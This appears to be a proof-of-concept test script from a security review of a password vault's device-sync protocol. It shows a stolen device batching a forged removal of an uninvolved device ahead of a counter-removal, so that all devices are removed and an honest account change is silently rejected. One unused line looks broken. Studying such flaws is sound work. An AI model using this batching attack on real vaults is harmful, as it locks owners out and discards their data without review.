// @ts-nocheck PoC script, run as is by vaultRound4.test.ts
// S1: the counter-removal exception admits every line before the counter-removal in the same
// batch (checkAdmission: lastAllowed). A removed device's stale removal of an UNINVOLVED device is
// not rejected by the rules (removals are judged on their own past, cutoffs don't apply), so it
// rides in front of the counter-removal through the HONEST agent. Result: an uninvolved honest
// device is removed too, and its account changes since the remover's view are rejected without
// being "caught" (no review offered).
// PASS = the attack step worked.
import { addDevice, agentAppend, build, check, clone, dev, found, now, open, random, rec, st, status, summary } from './lib';

const A = dev(); // founder, honest, uninvolved
const B = dev(); // tablet, honest: removes the stolen phone
const F = dev(); // phone, later stolen
const names = { [A.deviceId]: 'A', [B.deviceId]: 'B', [F.deviceId]: 'F' };

const v = found(A, 'personal');
const id = v.vaultId;
addDevice(id, v.logs, A, B);
addDevice(id, v.logs, A, F);
const thiefCopy = clone(v.logs); // the stolen phone's stale copy

// Owner removes the stolen phone from the tablet, through the honest agent.
const s1 = st(id, v.logs);
const rem = build.buildDeviceRemove(s1, B, { device: F.deviceId, currentKey: open.openVault(s1, B).currentKey, random, time: now() });
agentAppend(id, v.logs, [rem.entry]);
// A keeps working: adds an account after the removal.
const s2 = st(id, v.logs);
const putA = build.buildAccountPut(s2, A, { account: build.newAccountId(random), record: rec('A-after-removal'), currentKey: open.openVault(s2, A).currentKey, random, time: now() });
agentAppend(id, v.logs, [putA]);
console.log('before', summary(st(id, v.logs), names));

// Thief: from the stale copy, signs "remove A" (not symmetric: A neither removed F nor approved B
// unseen), then "remove B" (the true-symmetric counter-removal), in ONE batch.
const sT = st(id, thiefCopy);
const kT = open.openVault(sT, F).currentKey;
const r1 = build.buildDeviceRemove(sT, F, { device: A.deviceId, currentKey: kT, random, time: now() });
const sT2 = build.afterOwnEntry(sT, r1.entry);
const r2 = build.buildDeviceRemove(sT2, F, { device: B.deviceId, currentKey: kT, random, time: now() });

// Control: the rider alone is refused.
let aloneRefused = false;
try { agentAppend(id, clone(v.logs), [r1.entry]); } catch (e) { aloneRefused = true; console.log('alone:', (e as Error).message); }

let accepted = false;
try { agentAppend(id, v.logs, [r1.entry, r2.entry]); accepted = true; } catch (e) { console.log('refused:', (e as Error).message); }
const after = st(id, v.logs);
console.log('after ', summary(after, names));
console.log('  F removes A:', status(after, r1.entry));
console.log('  F removes B:', status(after, r2.entry));
console.log('  A put after B removed F:', status(after, putA));
const hist = after.history.find((h: any) => h.hash === build.afterOwnEntry && 0);
const putItem = after.history.find((h: any) => h.status && h.kind === 'account.put' && h.author === A.deviceId);
check('control: "F removes A" alone is refused by the agent', aloneRefused);
check('agent accepts [F removes A, F removes B] in one batch', accepted);
check('uninvolved A is now removed', after.members[A.deviceId]?.removed === true);
check('every device is out', Object.values(after.members).every((m: any) => m.removed));
check('A\'s account change after the removal is rejected', status(after, putA).startsWith('rejected'));
check('...and NOT marked caught (no review offered)', !!putItem && !putItem.caught);
